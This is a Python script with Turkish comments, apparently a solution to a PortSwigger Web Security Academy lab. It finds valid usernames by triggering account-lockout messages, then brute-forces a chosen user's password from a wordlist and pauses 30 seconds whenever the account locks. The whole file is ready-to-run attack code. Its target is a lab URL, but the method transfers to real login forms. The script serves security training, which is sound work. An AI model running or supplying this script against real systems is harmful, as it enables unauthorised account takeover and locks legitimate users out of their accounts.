"""
kodu çalıştırmadan önce labın açıklamasındaki kullanıcı adı ve parola listesini ayrı ayrı txt 
dosyasına kaydet.
enumeration işlemini gerçekleştirmek için (python account_block_bf.py -E kullanıcı_adları.txt)
brute force işemi için (python account_block_bf.py -u kullanıcı_adı -P parola_listesi.txt)

"""

import requests
import time
import argparse
import sys


# Hedef URL'yi kendi CTF lab adresiniz ile güncelleyin.
TARGET_URL = "https://0a23001c034179ca817d250c00ae00fd.web-security-academy.net/login"

# İstek atılırken kullanılacak temel başlıklar (Cookie ve diğer başlıkları buraya ekleyebilirsiniz)
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Firefox/149.0",
    "Content-Type": "application/x-www-form-urlencoded"
}

def enumerate_users(user_list_path):
    print(f"[*] Enumeration başlatılıyor... Hedef liste: {user_list_path}")
    try:
        with open(user_list_path, 'r') as f:
            users = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print("[-] Kullanıcı listesi bulunamadı.")
        sys.exit(1)

    valid_users = []
    
    for user in users:
        print(f"[*] Test ediliyor: {user}")
        # Kullanıcıyı kilitlemek için 4 kez hatalı istek atıyoruz
        for attempt in range(4):
            data = {"username": user, "password": "InvalidPassword123"}
            
            try:
                # Yönlendirmeleri (302) takip etmemek için allow_redirects=False kullanıyoruz
                response = requests.post(TARGET_URL, data=data, headers=HEADERS, allow_redirects=False)
                
                # Standart hata mesajı dönmüyorsa, hesap kilitlenmiş demektir.
                if "Invalid username or password." not in response.text:
                    print(f"[+] Geçerli Kullanıcı Bulundu: {user} (Farklı mesaj alındı)")
                    valid_users.append(user)
                    break # Bu kullanıcı için daha fazla denemeye gerek yok
            except requests.RequestException as e:
                print(f"[-] İstek hatası: {e}")
                
    return valid_users

def bruteforce_password(username, pass_list_path):
    print(f"[*] Parola Brute Force başlatılıyor... Kullanıcı: {username}")
    try:
        with open(pass_list_path, 'r') as f:
            passwords = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print("[-] Parola listesi bulunamadı.")
        sys.exit(1)

    i = 0
    while i < len(passwords):
        password = passwords[i]
        data = {"username": username, "password": password}
        
        try:
            response = requests.post(TARGET_URL, data=data, headers=HEADERS, allow_redirects=False)
            
            # Başarılı giriş genellikle bir oturum çerezi ve 302 yönlendirmesi döndürür
            if response.status_code == 302:
                print(f"\n[+++] BAŞARILI! Kullanıcı: {username} | Parola: {password}")
                break
            
            # Eğer hata mesajı standart hata değilse, hesap kilitlenmiştir.
            elif "Invalid username or password." not in response.text:
                print(f"[-] Hesap kilitlendi uyarısı alındı. 30 saniye bekleniyor... (Denenecek şifre: {password})")
                time.sleep(30)
                # i değişkenini artırmıyoruz. Böylece 30 saniye sonra aynı şifre tekrar denenecek.
            
            # Standart hata mesajı dönüyorsa şifre yanlıştır, bir sonrakine geçilir.
            else:
                print(f"[-] Başarısız: {password}")
                i += 1
                
        except requests.RequestException as e:
             print(f"[-] İstek hatası: {e}")
             time.sleep(5) # Olası bir bağlantı hatasında bekle ve aynı şifreyi tekrar dene

def main():
    parser = argparse.ArgumentParser(description=" Username Enumeration via Account Lockout & Bruteforce")
    parser.add_argument("-E", "--enum-list", help="Kullanıcı adlarını numaralandırmak (enumerate) için txt dosyası.")
    parser.add_argument("-u", "--username", help="Parola denemesi (brute-force) yapılacak geçerli kullanıcı adı.")
    parser.add_argument("-P", "--pass-list", help="Parola denemesi için txt dosyası.")
    
    args = parser.parse_args()

    # Senaryo 1: Kullanıcı Adı Numaralandırma
    if args.enum_list and not args.username:
        enumerate_users(args.enum_list)
        
    # Senaryo 2: Parola Brute Force
    elif args.username and args.pass_list:
        bruteforce_password(args.username, args.pass_list)
        
    else:
        parser.print_help()

if __name__ == "__main__":
    main()